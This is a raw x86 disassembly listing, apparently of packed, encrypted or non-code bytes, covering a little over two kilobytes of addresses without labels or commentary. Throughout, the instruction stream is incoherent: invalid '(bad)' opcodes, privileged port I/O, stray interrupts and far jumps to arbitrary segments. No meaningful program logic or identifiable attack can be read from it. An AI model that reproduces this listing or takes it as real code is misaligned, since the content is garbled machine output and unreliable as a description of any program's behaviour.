  4062e0:	rol    edi,0xe0
  4062e3:	and    DWORD PTR [eax],esp
  4062e5:	inc    eax
  4062e6:	aad    0x61
  4062e8:	mov    esp,DWORD PTR [esi+0x4a259fc8]
  4062ee:	arpl   WORD PTR [esi-0x76bcdca4],di
  4062f4:	fdivr  QWORD PTR [edx]
  4062f6:	mov    esi,0x8a4e960f
  4062fb:	xchg   esi,eax
  4062fc:	test   eax,0xe40f07a5
  406301:	inc    ebx
  406302:	int    0x9a
  406304:	shl    BYTE PTR [ecx+0x23bcaf9],1
  40630a:	cmp    DWORD PTR [edx-0x16],esi
  40630d:	js     0x40635d
  40630f:	mov    bh,BYTE PTR [ecx]
  406311:	xchg   ebp,eax
  406312:	inc    edx
  406313:	in     al,dx
  406314:	dec    esp
  406315:	push   es
  406316:	xor    ch,0x82
  406319:	add    esp,DWORD PTR [esi-0x3b]
  40631c:	mov    dh,0x37
  40631e:	shr    BYTE PTR [edx+0x5],0x43
  406322:	shl    DWORD PTR [ecx],cl
  406324:	(bad)  
  406325:	mov    ch,0x9f
  406327:	jecxz  0x406328
  406329:	outs   dx,DWORD PTR ds:[esi]
  40632a:	pop    ebp
  40632b:	cmc    
  40632c:	test   BYTE PTR [esi],cl
  40632e:	dec    edi
  40632f:	jmp    0x406388
  406331:	add    DWORD PTR [edx-0x2f690304],ebp
  406337:	cmc    
  406338:	sub    edx,0xffffffb6
  40633b:	call   0x9b856b60
  406340:	inc    esp
  406341:	mov    edi,0x77955f33
  406346:	lods   al,BYTE PTR ds:[esi]
  406347:	fidivr DWORD PTR [ebx+0x44]
  40634a:	add    BYTE PTR [ebp+0xfada490],cl
  406350:	add    dh,BYTE PTR [edx]
  406352:	neg    ecx
  406354:	retf   
  406355:	data16 (bad) 
  406357:	aas    
  406358:	fld    DWORD PTR [edx-0x5870047]
  40635e:	and    eax,0x48123d22
  406363:	inc    eax
  406364:	inc    eax
  406365:	sub    al,0xcd
  406367:	sbb    al,0xda
  406369:	sbb    DWORD PTR [edi-0x207c8ca1],edx
  40636f:	mov    WORD PTR [ebx*4-0x1268b9c9],es
  406376:	pop    es
  406377:	and    ebp,DWORD PTR [edx]
  406379:	repz not BYTE PTR ds:0x84cb915d
  406381:	out    0x91,eax
  406383:	int    0xa9
  406385:	or     eax,0x23639bb0
  40638a:	or     edx,DWORD PTR [ecx+0x43fc9d68]
  406390:	push   esi
  406391:	sub    eax,0xb43bf756
  406396:	inc    esi
  406397:	jmp    0xb589:0x8eb3c04f
  40639e:	xchg   edx,eax
  40639f:	leave  
  4063a0:	outs   dx,BYTE PTR ds:[esi]
  4063a1:	push   ebp
  4063a2:	jle    0x40633c
  4063a4:	inc    esp
  4063a5:	and    BYTE PTR [ebx+0x7c],dl
  4063a8:	add    BYTE PTR ds:0x45bf768d,al
  4063ae:	push   cs
  4063af:	retf   
  4063b0:	pop    ss
  4063b1:	mov    esp,esp
  4063b3:	mov    edi,0xc3d805b8
  4063b8:	and    BYTE PTR [esi],al
  4063ba:	das    
  4063bb:	inc    esi
  4063bc:	shl    ebp,cl
  4063be:	or     BYTE PTR [esi],bl
  4063c0:	nop
  4063c1:	push   ebp
  4063c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4063c3:	push   edi
  4063c4:	sbb    eax,0xc4b1c020
  4063c9:	lds    edi,FWORD PTR [ecx+0x8b26be9]
  4063cf:	test   DWORD PTR [ebp-0x15],ebx
  4063d2:	xchg   edi,eax
  4063d3:	jno    0x406411
  4063d5:	jle    0x406381
  4063d7:	outs   dx,DWORD PTR ds:[esi]
  4063d8:	in     eax,0x91
  4063da:	lock addr16 retf 0xfc38
  4063df:	pop    ebp
  4063e0:	rcl    DWORD PTR [ecx-0x2237d217],1
  4063e6:	or     edx,DWORD PTR [edx]
  4063e8:	mov    eax,0xebeaf444
  4063ed:	rol    DWORD PTR [ebx+0x71],1
  4063f0:	out    dx,eax
  4063f1:	pop    ebx
  4063f2:	sti    
  4063f3:	repz mov eax,ds:0x48b8804b
  4063f9:	loopne 0x406430
  4063fb:	dec    edi
  4063fc:	add    eax,0xa30b4862
  406401:	loop   0x40644c
  406403:	nop
  406404:	inc    esp
  406405:	and    BYTE PTR [esi],cl
  406407:	pusha  
  406408:	or     BYTE PTR [eax-0x1cb66a24],bh
  40640e:	push   edi
  40640f:	rol    dl,0x44
  406412:	push   eax
  406413:	pop    esi
  406414:	pop    esi
  406415:	inc    ecx
  406416:	bswap  edx
  406418:	fs mov eax,0x7a96fe74
  40641e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40641f:	cmp    ah,BYTE PTR [edx]
  406421:	ja     0x406484
  406423:	pop    ss
  406424:	scas   al,BYTE PTR es:[edi]
  406425:	jae    0x406482
  406427:	das    
  406428:	add    DWORD PTR [ecx],esi
  40642a:	mov    ds:0x3b63bda6,eax
  40642f:	ret    
  406430:	inc    ecx
  406431:	or     al,0xfe
  406433:	sbb    BYTE PTR [esi],0xa0
  406436:	call   0x353b7734
  40643b:	int3   
  40643c:	add    esi,DWORD PTR ds:0xb6abf56b
  406442:	dec    esi
  406443:	dec    ebx
  406444:	xchg   edx,eax
  406445:	test   eax,0xf74a60e1
  40644a:	mov    ah,0x4
  40644c:	mov    bh,0x6f
  40644e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40644f:	out    dx,eax
  406450:	push   0x71
  406452:	or     BYTE PTR [esi],ch
  406454:	fiadd  WORD PTR [esp+ebx*1]
  406457:	sbb    ebp,esp
  406459:	shl    BYTE PTR [edx],1
  40645b:	xchg   dh,bh
  40645d:	push   ebx
  40645e:	mov    BYTE PTR [eax],dl
  406460:	loopne 0x4064a8
  406462:	pop    es
  406463:	std    
  406464:	inc    edi
  406465:	daa    
  406466:	ficomp WORD PTR [edi+0x1a]
  406469:	fsub   st(6),st
  40646b:	aad    0x14
  40646d:	cld    
  40646e:	loop   0x4063f1
  406470:	xlat   BYTE PTR ds:[ebx]
  406471:	cmp    dh,BYTE PTR [edi-0x2d]
  406474:	cmp    al,0x91
  406476:	inc    ebp
  406477:	in     eax,dx
  406478:	push   ebp
  406479:	adc    BYTE PTR [ebp+0x5f],dl
  40647c:	mov    eax,0x3f9f58b
  406481:	out    dx,eax
  406482:	icebp  
  406483:	outs   dx,DWORD PTR ds:[esi]
  406484:	retf   
  406485:	or     DWORD PTR [eax+0x51],ecx
  406488:	mov    ds:0x7731e35e,al
  40648d:	xchg   esi,eax
  40648e:	sub    edx,DWORD PTR [ebx]
  406490:	jmp    0x40643b
  406492:	mov    ds:0x679d3eb3,al
  406497:	xor    esp,DWORD PTR [ebx]
  406499:	mov    ah,0xf9
  40649b:	and    ebx,eax
  40649d:	pop    ss
  40649e:	fcomi  st,st(0)
  4064a0:	jnp    0x40650f
  4064a2:	gs addr16 inc edx
  4064a5:	scas   eax,DWORD PTR es:[edi]
  4064a6:	je     0x406450
  4064a8:	cmp    bh,BYTE PTR [edx-0x6c]
  4064ab:	fnstcw WORD PTR [eax+0x7d35c764]
  4064b1:	out    dx,eax
  4064b2:	pop    ecx
  4064b3:	and    BYTE PTR [ecx],cl
  4064b5:	dec    esi
  4064b6:	stc    
  4064b7:	jge    0x4064f6
  4064b9:	popa   
  4064ba:	es retf 0xbc96
  4064be:	cmp    esp,ebp
  4064c0:	addps  xmm5,XMMWORD PTR [edi+0x649babce]
  4064c7:	push   ebx
  4064c8:	pop    esp
  4064c9:	jae    0x40649b
  4064cb:	(bad)  
  4064cc:	jae    0x40646b
  4064ce:	je     0x4064e5
  4064d0:	xor    eax,0x659fe0b8
  4064d5:	jb     0x406494
  4064d7:	jp     0x406544
  4064d9:	pushf  
  4064da:	std    
  4064db:	pop    esi
  4064dc:	(bad)  
  4064de:	add    esp,DWORD PTR [edi]
  4064e0:	hlt    
  4064e1:	jle    0x406498
  4064e3:	push   eax
  4064e4:	stos   BYTE PTR es:[edi],al
  4064e5:	clc    
  4064e6:	mov    dl,0x6b
  4064e8:	add    BYTE PTR [ebx+ebx*2+0x1c],ah
  4064ec:	loope  0x40648d
  4064ee:	dec    ebp
  4064ef:	add    cl,dh
  4064f1:	mov    edx,0x18cd8c67
  4064f6:	push   ss
  4064f7:	lea    ebp,[edx]
  4064f9:	int    0x7f
  4064fb:	loop   0x4064f6
  4064fd:	sub    ch,bh
  4064ff:	adc    al,0xd8
  406501:	ret    
  406502:	jb     0x406503
  406504:	cmp    BYTE PTR [ebp-0x57],bl
  406507:	dec    eax
  406508:	mov    eax,ds:0xa75602c0
  40650d:	mov    al,ds:0xa4654841
  406512:	push   0x9fd6ba00
  406517:	sti    
  406518:	xchg   BYTE PTR [edi-0x38],cl
  40651b:	cmp    cl,BYTE PTR [edi]
  40651d:	add    eax,0xd68f3f40
  406522:	and    bh,BYTE PTR [ebp-0x2094b499]
  406528:	shl    DWORD PTR [edi],cl
  40652a:	fild   WORD PTR [eax]
  40652c:	jecxz  0x406572
  40652e:	into   
  40652f:	xchg   BYTE PTR [ebx],dl
  406531:	test   BYTE PTR ds:0xf742e9a9,dl
  406537:	xchg   esp,eax
  406538:	or     bl,BYTE PTR [esi+edi*4+0x3e3a9da7]
  40653f:	pushf  
  406540:	repz (bad) 
  406542:	xchg   edi,eax
  406543:	rcl    al,1
  406545:	(bad)  
  406546:	xchg   edx,eax
  406547:	cmp    al,0xef
  406549:	jno    0x406514
  40654b:	add    al,0xe8
  40654d:	shl    BYTE PTR [ecx+0x28],0x92
  406551:	xor    esp,DWORD PTR [ebx+0x71025652]
  406557:	sub    eax,0xd29a8bca
  40655c:	push   ss
  40655d:	leave  
  40655e:	mov    al,ds:0xa827d9cf
  406563:	ret    0x2646
  406566:	mov    esp,0x873f18ab
  40656b:	mov    ds:0xa619a6c3,eax
  406570:	outs   dx,BYTE PTR ds:[esi]
  406571:	icebp  
  406572:	dec    esp
  406573:	ins    DWORD PTR es:[edi],dx
  406574:	jb     0x4065ef
  406576:	pop    edx
  406577:	jge    0x406567
  406579:	es push esp
  40657b:	pop    ecx
  40657c:	xor    BYTE PTR [ecx-0x5a],0xb
  406580:	pop    ecx
  406581:	mov    ds:0xa055e8cf,eax
  406586:	pop    es
  406587:	and    bl,bh
  406589:	dec    edx
  40658a:	mov    ds:0xc5d65471,al
  40658f:	mov    al,0x8f
  406591:	dec    esi
  406592:	adc    DWORD PTR [edi+ecx*4],edi
  406595:	sub    al,0x23
  406597:	mov    al,ds:0xa1b84d35
  40659c:	je     0x406526
  40659e:	and    bl,0x19
  4065a1:	jb     0x406536
  4065a3:	mov    al,ds:0x4764556d
  4065a8:	cmp    al,0xbc
  4065aa:	cmp    DWORD PTR [esi+0x3c],0x3dc56337
  4065b1:	femms  
  4065b3:	xchg   DWORD PTR [ebp+0x1e],edx
  4065b6:	mov    esp,DWORD PTR [eax-0x24]
  4065b9:	mov    eax,ds:0x14cafc49
  4065bf:	(bad)  
  4065c0:	fild   DWORD PTR ds:0x3dce71e0
  4065c6:	not    ebx
  4065c8:	and    ch,ch
  4065ca:	and    WORD PTR [edx+0x1074f18f],0x7f
  4065d2:	mov    ds:0x42e914a2,al
  4065d7:	pop    esp
  4065d8:	adc    eax,0xcca906e1
  4065dd:	rol    BYTE PTR [ecx],1
  4065df:	pop    ds
  4065e0:	out    0x20,al
  4065e2:	mov    edi,0x8b20e27a
  4065e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065e8:	pop    esi
  4065e9:	mov    eax,0x24f47e9e
  4065ee:	xchg   DWORD PTR [eax-0x2f],esp
  4065f1:	int3   
  4065f2:	dec    esp
  4065f3:	jge    0x4065f9
  4065f5:	push   ebp
  4065f6:	sbb    BYTE PTR [ecx+0x4492284d],bh
  4065fc:	pushf  
  4065fd:	adc    bh,dl
  4065ff:	inc    edi
  406600:	dec    ecx
  406601:	aas    
  406602:	cmc    
  406603:	dec    ecx
  406604:	jns    0x4065fe
  406606:	add    BYTE PTR [eax-0x4b],0x93
  40660a:	cs arpl sp,bp
  40660d:	and    esi,eax
  40660f:	mov    edi,0xe6d2b64a
  406614:	cmp    eax,0x4cb3f5f9
  406619:	dec    edx
  40661a:	test   al,0xd
  40661c:	and    al,0xc2
  40661e:	sub    al,bl
  406620:	dec    ecx
  406621:	std    
  406622:	mov    edx,0xabfb5ffd
  406627:	inc    ebx
  406628:	call   0xc7fe:0x4872b572
  40662f:	cmp    al,0xcd
  406631:	push   edx
  406632:	out    0xc1,al
  406634:	lea    ebx,[esi+edi*2-0x5353d844]
  40663b:	test   DWORD PTR [edx+0x61],esp
  40663e:	ins    DWORD PTR es:[edi],dx
  40663f:	dec    eax
  406640:	push   edi
  406641:	repnz push cs
  406643:	add    ecx,esi
  406645:	sbb    ax,0x54ba
  406649:	add    al,0xc6
  40664b:	stos   BYTE PTR es:[edi],al
  40664c:	push   ebp
  40664d:	repnz dec ecx
  40664f:	sub    BYTE PTR [edx+0x6f66b4cf],dh
  406655:	fisttp QWORD PTR [ebp-0x2c]
  406658:	mov    bl,0xb8
  40665a:	cmp    DWORD PTR [edx+eiz*2],0xfef54a3a
  406661:	inc    ebp
  406662:	call   0xf2b7afaa
  406667:	xchg   edi,eax
  406668:	fstp   st(5)
  40666a:	sub    eax,0x4c13edd5
  40666f:	mov    ds:0xb7cdfc74,eax
  406674:	test   BYTE PTR [edi+0x67],cl
  406677:	imul   eax,ebx,0x6addebc
  40667d:	mov    ebx,0x3e342211
  406682:	cmp    DWORD PTR [ecx+ecx*4-0x34],edx
  406686:	xchg   BYTE PTR [ecx-0xe],dl
  406689:	lea    eax,[edx+ecx*1-0x7c28a994]
  406690:	or     eax,DWORD PTR [eax+0x78c8d688]
  406696:	xchg   esp,eax
  406697:	arpl   WORD PTR [edx-0x40e76eb],ax
  40669d:	into   
  40669e:	out    dx,al
  40669f:	inc    edi
  4066a0:	push   ds
  4066a1:	ror    DWORD PTR [edx+eax*2+0x2d7d0237],cl
  4066a8:	jno    0x40664f
  4066aa:	sti    
  4066ab:	jecxz  0x40663c
  4066ad:	mov    bh,0x38
  4066af:	mov    dh,0x8
  4066b1:	ins    BYTE PTR es:[edi],dx
  4066b2:	pop    esi
  4066b3:	push   ds
  4066b4:	loop   0x406713
  4066b6:	mov    ds:0xaa69be75,eax
  4066bb:	icebp  
  4066bc:	imul   ecx,DWORD PTR [edx],0xffffffd2
  4066bf:	pop    ss
  4066c0:	repz inc edi
  4066c2:	clc    
  4066c3:	jmp    0x885c10e2
  4066c8:	ficom  DWORD PTR [ebp+0x35]
  4066cb:	sbb    BYTE PTR [edi+0x1c02aa96],0x2b
  4066d2:	pop    ss
  4066d3:	add    al,0xd0
  4066d5:	sar    DWORD PTR [esi*1+0x1147848a],1
  4066dc:	test   al,0x4e
  4066de:	sbb    BYTE PTR [ebp-0x3bffb4ef],dh
  4066e4:	xor    BYTE PTR [esi-0x75],dl
  4066e7:	shl    ebp,0x79
  4066ea:	adc    bl,BYTE PTR [edi+0x44b1dc3]
  4066f0:	sbb    dl,BYTE PTR [edx-0x2721d02b]
  4066f6:	cs in  eax,0xca
  4066f9:	sbb    eax,esi
  4066fb:	and    DWORD PTR [edi-0x76],edi
  4066fe:	repnz and DWORD PTR [ebp+0x77],0x30cbb5bf
  406706:	addr16 jg 0x406758
  406709:	adc    DWORD PTR [eax],ecx
  40670b:	fwait
  40670c:	mov    ch,0x30
  40670e:	sahf   
  40670f:	fisub  WORD PTR [ebp+esi*2-0x15a58e7d]
  406716:	sbb    dl,bh
  406718:	leave  
  406719:	xchg   esi,eax
  40671a:	mov    bh,0xb3
  40671c:	mov    al,0xab
  40671e:	jp     0x406711
  406720:	jmp    0x7593:0xb289bddf
  406727:	iret   
  406728:	jnp    0x406738
  40672a:	out    dx,al
  40672b:	add    bl,bh
  40672d:	xchg   cl,bh
  40672f:	ret    0x5d55
  406732:	rcl    BYTE PTR [edx+0x5b58ca19],0x3b
  406739:	sub    DWORD PTR [ebx+0x206eed66],ebp
  40673f:	push   ebx
  406740:	clc    
  406741:	pop    es
  406742:	outs   dx,BYTE PTR ds:[esi]
  406743:	fsub   QWORD PTR [edx+edi*4]
  406746:	xchg   ebx,eax
  406747:	loopne 0x4066dc
  406749:	xadd   BYTE PTR [edi-0x45244939],bh
  406750:	lods   eax,DWORD PTR ds:[esi]
  406751:	mov    ebx,0x47eca761
  406756:	dec    esp
  406757:	inc    esp
  406758:	lods   al,BYTE PTR ds:[esi]
  406759:	mov    ds:0x27996a3,al
  40675e:	add    ebx,DWORD PTR [esi-0xd19462]
  406764:	mov    ebp,0xf2249996
  406769:	mov    ecx,0x93aa0dc5
  40676e:	pop    edi
  40676f:	int    0x59
  406771:	mov    edi,0xd5f4abc4
  406776:	mov    ebp,0xae95d932
  40677b:	sbb    dh,BYTE PTR [eax-0x7a]
  40677e:	mov    bh,0x64
  406780:	xchg   esp,eax
  406781:	stc    
  406782:	dec    eax
  406783:	mov    WORD PTR [ebp+0x3cf9daaf],?
  406789:	into   
  40678a:	push   esi
  40678b:	and    DWORD PTR ds:0x905b87b8,esi
  406791:	test   al,0xa4
  406793:	call   0x63a00a78
  406798:	jmp    0xf8b2:0xc2e2e86c
  40679f:	leave  
  4067a0:	or     eax,ecx
  4067a2:	cmp    esi,ebp
  4067a4:	mov    ds:0xa7510541,eax
  4067a9:	cld    
  4067aa:	icebp  
  4067ab:	add    ah,dl
  4067ad:	mov    bh,0xe1
  4067af:	frstor [edx]
  4067b1:	jmp    0x40679a
  4067b3:	mov    ah,0x80
  4067b5:	dec    ebp
  4067b6:	cmp    al,0x2c
  4067b8:	ficom  DWORD PTR ds:0x6d51bfc2
  4067be:	test   eax,0xf02239d9
  4067c3:	dec    edi
  4067c4:	xor    al,0xd1
  4067c6:	xor    bh,bl
  4067c8:	ja     0x4067f0
  4067ca:	push   esi
  4067cb:	adc    cl,cl
  4067cd:	adc    eax,0x849f1972
  4067d2:	mov    BYTE PTR ds:0xc3c3d187,ah
  4067d8:	sbb    eax,0x9c60d44c
  4067dd:	jnp    0x4067b5
  4067df:	jge    0x406850
  4067e1:	iret   
  4067e2:	data16 addr16 jne 0x406814
  4067e6:	mov    bh,0x2
  4067e8:	arpl   bx,di
  4067ea:	mov    eax,ds:0x41e736a0
  4067ef:	nop
  4067f0:	das    
  4067f1:	stc    
  4067f2:	fild   QWORD PTR [esi-0x154cfb4d]
  4067f8:	cmp    BYTE PTR [eax+ecx*2],bl
  4067fb:	add    DWORD PTR [esp+ecx*1-0x25],0x83711403
  406803:	push   ss
  406804:	test   BYTE PTR [ebx+0x2d],0xb7
  406808:	not    DWORD PTR [ebx]
  40680a:	enter  0x4163,0x5c
  40680e:	clc    
  40680f:	mov    al,ds:0x72c8887b
  406814:	(bad)  
  406816:	cmp    eax,0x50ff56a4
  40681b:	push   edx
  40681c:	mov    esi,DWORD PTR [eax+ecx*4]
  40681f:	scas   al,BYTE PTR es:[edi]
  406820:	adc    eax,0x91dd8c5
  406825:	sbb    eax,0x2787e45
  40682a:	js     0x4067cb
  40682c:	mov    ecx,ecx
  40682e:	idiv   DWORD PTR [esi]
  406830:	popf   
  406831:	add    al,0xbd
  406833:	mov    ds:0x1f5307be,eax
  406838:	cdq    
  406839:	dec    esi
  40683a:	jecxz  0x40686a
  40683c:	in     al,dx
  40683d:	mov    eax,0x254863a7
  406842:	sbb    eax,0x78a26e39
  406847:	pop    es
  406848:	sub    BYTE PTR [eax],0xe
  40684b:	jno    0x4068ca
  40684d:	or     edi,DWORD PTR [edx-0x17]
  406850:	test   BYTE PTR [eax],ah
  406852:	add    eax,0x796245d8
  406857:	dec    ebx
  406858:	sub    edi,eax
  40685a:	sbb    cl,BYTE PTR [ecx+edx*2-0x634d2cc8]
  406861:	in     al,dx
  406862:	mov    edx,0x18eab522
  406867:	mov    esi,0xc0b6dd79
  40686c:	adc    ecx,DWORD PTR [ebx]
  40686e:	scas   al,BYTE PTR es:[edi]
  40686f:	mov    ds,WORD PTR [ecx+0x55]
  406872:	shl    BYTE PTR [ecx+0x3bc803e6],cl
  406878:	add    eax,0xa82461b3
  40687d:	inc    eax
  40687e:	es (bad) 
  406880:	popa   
  406881:	pop    es
  406882:	push   eax
  406883:	dec    DWORD PTR [edx+0x42c8403b]
  406889:	or     ecx,DWORD PTR [eax+ebx*8+0x4e]
  40688d:	cmp    eax,0xff7fb153
  406892:	je     0x40690d
  406894:	cli    
  406895:	cwde   
  406896:	mov    esp,ds
  406898:	aad    0xef
  40689a:	and    DWORD PTR [ecx+edx*1],esp
  40689d:	push   ebp
  40689e:	jmp    0x4068af
  4068a0:	or     al,0x77
  4068a2:	repz jle 0x4068a8
  4068a5:	cdq    
  4068a6:	ror    BYTE PTR [eax-0x273f9640],0x32
  4068ad:	or     bh,al
  4068af:	call   0x601969a5
  4068b4:	frstor [ecx+0x7e35896c]
  4068ba:	popa   
  4068bb:	enter  0x39bc,0xb9
  4068bf:	mov    al,ds:0x9654b2b
  4068c4:	and    BYTE PTR [edi+0x35],dl
  4068c7:	lods   eax,DWORD PTR ds:[esi]
  4068c8:	enter  0x7ba0,0xc3
  4068cc:	push   ebx
  4068cd:	mov    ds:0x5fb889c8,al
  4068d2:	mov    esi,0x97fad804
  4068d7:	jns    0x40691e
  4068d9:	sub    esi,ebx
  4068db:	xor    al,0xb5
  4068dd:	pop    DWORD PTR [ebx-0x147e08f8]
  4068e3:	cmc    
  4068e4:	lods   al,BYTE PTR ds:[esi]
  4068e5:	mov    esi,0x116a5e72
  4068ea:	pop    ebp
  4068eb:	xchg   ecx,eax
  4068ec:	scas   al,BYTE PTR es:[edi]
  4068ed:	sub    dl,dl
  4068ef:	sti    
  4068f0:	das    
  4068f1:	xor    eax,0x3020d08f
  4068f6:	aas    
  4068f7:	lahf   
  4068f8:	scas   eax,DWORD PTR es:[edi]
  4068f9:	pusha  
  4068fa:	les    edi,FWORD PTR [eax-0x77]
  4068fd:	jns    0x4068a5
  4068ff:	mov    eax,0x40b59c01
  406904:	cmc    
  406905:	push   ss
  406906:	dec    ecx
  406907:	scas   eax,DWORD PTR es:[edi]
  406908:	mov    dl,0x5d
  40690a:	daa    
  40690b:	loope  0x406919
  40690d:	jp     0x4068ca
  40690f:	cli    
  406910:	xor    DWORD PTR [edi-0x6a],esi
  406913:	jno    0x4068d4
  406915:	cli    
  406916:	stc    
  406917:	xor    esi,eax
  406919:	bound  ebx,QWORD PTR [esi-0x30]
  40691c:	aad    0x2f
  40691e:	in     eax,0x6f
  406920:	sbb    ah,BYTE PTR [ebx]
  406922:	inc    ebx
  406923:	ror    esp,1
  406925:	aas    
  406926:	scas   eax,DWORD PTR es:[edi]
  406927:	shl    BYTE PTR ds:0xf3dba3e3,0x91
  40692e:	test   al,0xe3
  406930:	scas   al,BYTE PTR es:[edi]
  406931:	mov    ?,WORD PTR [edx+0x7]
  406934:	mov    al,ds:0x62be9c71
  406939:	add    ebp,DWORD PTR [ebx-0x2170c0e9]
  40693f:	dec    eax
  406940:	mov    ch,0x41
  406942:	(bad)  
  406943:	mov    al,ds:0xaeb5bcb6
  406948:	mov    cl,0x45
  40694a:	xchg   esi,eax
  40694b:	leave  
  40694c:	sar    DWORD PTR [bx+si],0x99
  406950:	sahf   
  406951:	mov    ds,WORD PTR [eax+ebp*2+0x6c237a1f]
  406958:	fild   QWORD PTR [edi+0x43b49d79]
  40695e:	inc    esi
  40695f:	fiadd  WORD PTR [ebp+0x57]
  406962:	jb     0x40692f
  406964:	or     dl,BYTE PTR [esi]
  406966:	pop    esi
  406967:	xchg   ebp,eax
  406968:	std    
  406969:	in     eax,0xbc
  40696b:	jg     0x4069df
  40696d:	sar    BYTE PTR [ebx],0x1
  406970:	inc    esi
  406971:	clc    
  406972:	jno    0x4069f1
  406974:	mov    eax,0x2da5fb6
  406979:	or     bl,BYTE PTR [ebx]
  40697b:	sbb    dh,BYTE PTR [edi]
  40697d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40697e:	aad    0xba
  406980:	mov    esp,0x10447a50
  406985:	push   0x77
  406987:	add    bh,BYTE PTR [eax+0x54]
  40698a:	in     eax,0x99
  40698c:	clc    
  40698d:	out    dx,al
  40698e:	clc    
  40698f:	aam    0x5d
  406991:	dec    eax
  406992:	or     DWORD PTR [eax],eax
  406994:	push   ebp
  406995:	lock mov ebx,0x6299dd43
  40699b:	adc    DWORD PTR [ebx-0x71b2c387],edi
  4069a1:	fs dec edx
  4069a4:	jno    0x406a1d
  4069a6:	sub    esp,ebp
  4069a8:	mov    bl,0xdf
  4069aa:	jnp    0x406970
  4069ac:	push   cs
  4069ad:	imul   esp,DWORD PTR [eax-0x21],0x841eb144
  4069b4:	mov    al,0xf3
  4069b6:	or     BYTE PTR [eax-0x1a3c8181],0xbb
  4069bd:	ret    0xe11
  4069c0:	aaa    
  4069c1:	iret   
  4069c2:	lock rol BYTE PTR [eax+edi*2],0x8d
  4069c7:	in     eax,0xb2
  4069c9:	ret    0x76fb
  4069cc:	sbb    al,0x34
  4069ce:	xchg   BYTE PTR [ecx+0xc],al
  4069d1:	test   BYTE PTR [eax-0x54],0x7
  4069d5:	sahf   
  4069d6:	jp     0x4069f7
  4069d8:	repnz mov ch,0xcf
  4069db:	xchg   ebp,eax
  4069dc:	jnp    0x4069d2
  4069de:	ret    
  4069df:	call   0x132c1ea0
  4069e4:	ins    BYTE PTR es:[edi],dx
  4069e5:	inc    edi
  4069e6:	ja     0x406971
  4069e8:	xor    BYTE PTR ds:0x22821d31,al
  4069ee:	test   DWORD PTR [esi+eax*1],edx
  4069f1:	test   eax,0x572018c3
  4069f6:	xchg   edx,eax
  4069f7:	xor    DWORD PTR [ebx],eax
  4069f9:	iret   
  4069fa:	repz cmc 
  4069fc:	or     bh,BYTE PTR [ebx-0x27]
  4069ff:	mov    dl,0x29
  406a01:	add    al,0x36
  406a03:	adc    al,0x2a
  406a05:	xchg   ecx,eax
  406a06:	iret   
  406a07:	ret    
  406a08:	push   0xffffff80
  406a0a:	lock fist DWORD PTR [ebx-0x1a4ff5fc]
  406a11:	int3   
  406a12:	jl     0x4069ea
  406a14:	xlat   BYTE PTR ds:[ebx]
  406a15:	lods   al,BYTE PTR ds:[esi]
  406a16:	jl     0x406a05
  406a18:	or     eax,esp
  406a1a:	outs   dx,BYTE PTR ds:[esi]
  406a1b:	fdivr  QWORD PTR [edi+0x6dcd045d]
  406a21:	add    DWORD PTR [edx+edi*2+0x40abf5e5],0x6bb37ce1
  406a2c:	xor    bl,bl
  406a2e:	fisub  DWORD PTR [edx-0x14937c54]
  406a34:	push   esi
  406a35:	pushf  
  406a36:	push   edx
  406a37:	inc    ebx
  406a38:	int    0x5
  406a3a:	(bad)  
  406a3b:	jmp    0xbf29:0x2ab1afee
  406a42:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a43:	sar    BYTE PTR [ecx-0x8],0xb1
  406a47:	retf   
  406a48:	in     al,dx
  406a49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a4a:	stc    
  406a4b:	gs inc edi
  406a4d:	fisttp WORD PTR [ebx+0x4f727360]
  406a53:	and    DWORD PTR [eax],ebp
  406a55:	cmp    al,0xa9
  406a57:	xor    al,ah
  406a59:	sbb    edx,esi
  406a5b:	test   al,0xc5
  406a5d:	(bad)  
  406a5e:	jns    0x406a55
  406a60:	repnz gs inc esi
  406a63:	test   eax,0xbc83be76
  406a68:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  406a6a:	stos   DWORD PTR es:[edi],eax
  406a6b:	cmp    al,0x10
  406a6d:	pushf  
  406a6e:	or     esp,esp
  406a70:	inc    edi
  406a71:	das    
  406a72:	cdq    
  406a73:	pushf  
  406a74:	push   ecx
  406a75:	push   edi
  406a76:	mov    ds:0xa13397a2,al
  406a7b:	xchg   ebp,eax
  406a7c:	jg     0x406a6b
  406a7e:	mov    cl,0xc1
  406a80:	mov    al,0xe3
  406a82:	push   cs
  406a83:	pop    edi
  406a84:	pshufw mm5,QWORD PTR [esi],0xf2
  406a88:	jg     0x406a43
  406a8a:	je     0x406af1
  406a8c:	gs and al,ah
  406a8f:	mov    dh,0x72
  406a91:	add    BYTE PTR [esi+0xb],0x2d
  406a95:	pop    ebx
  406a96:	inc    eax
  406a97:	mov    ds:0x5ed4f4b,eax
  406a9c:	out    dx,eax
  406a9d:	or     al,0x12
  406a9f:	or     eax,0x7ad57171
  406aa4:	jg     0x406a38
  406aa6:	ss ror ch,cl
  406aa9:	aas    
  406aaa:	retf   0x2fd4
  406aad:	popa   
  406aae:	push   ebp
  406aaf:	or     dh,ch
  406ab1:	(bad)  
  406ab2:	call   0x24834987
  406ab7:	mov    ebx,0xe3f32f61
  406abc:	xchg   DWORD PTR [ecx-0x5f767571],esi
  406ac2:	call   0x75cf:0xa8b7b93e
  406ac9:	xchg   esi,edx
  406acb:	in     eax,dx
  406acc:	fsub   st,st(4)
  406ace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406acf:	(bad)  
  406ad0:	call   0x6872e311
  406ad5:	scas   eax,DWORD PTR es:[edi]
  406ad6:	cdq    
  406ad7:	dec    ebx
  406ad8:	xor    eax,0xf116e13e
  406add:	lods   al,BYTE PTR ds:[esi]
  406ade:	cmc    
  406adf:	jl     0x406b45
  406ae1:	xchg   ebp,eax
  406ae2:	test   DWORD PTR [edx-0x1a9cf614],edx
  406ae8:	mov    cl,0x78
  406aea:	push   ebp
  406aeb:	outs   dx,DWORD PTR ds:[esi]
  406aec:	lahf   
  406aed:	sub    esp,ebp
  406aef:	adc    DWORD PTR [ebx-0x7b],ebx
  406af2:	int3   
  406af3:	adc    edi,DWORD PTR [edx+edi*1]
  406af6:	mov    edi,0xfddc95fc
